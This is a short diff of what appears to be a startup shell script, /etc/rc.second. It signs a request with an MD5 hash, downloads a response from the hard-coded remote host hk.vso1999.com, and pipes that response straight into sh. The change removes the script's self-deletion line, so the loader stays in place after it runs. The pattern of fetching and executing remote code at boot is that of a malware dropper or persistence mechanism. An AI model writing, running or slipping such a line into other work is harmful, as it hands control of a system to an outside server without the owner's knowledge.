@@ -13,4 +13,3 @@ signature=$(echo -n "${param}${nonce}${secret}" | md5sum | awk '{print $1}')
 curl -s "http://hk.vso1999.com:8080/api/active?param=${param}&nonce=${nonce}&sign=${signature}" | sh
 
 touch /etc/rc.second.lock
-rm -f /etc/rc.second
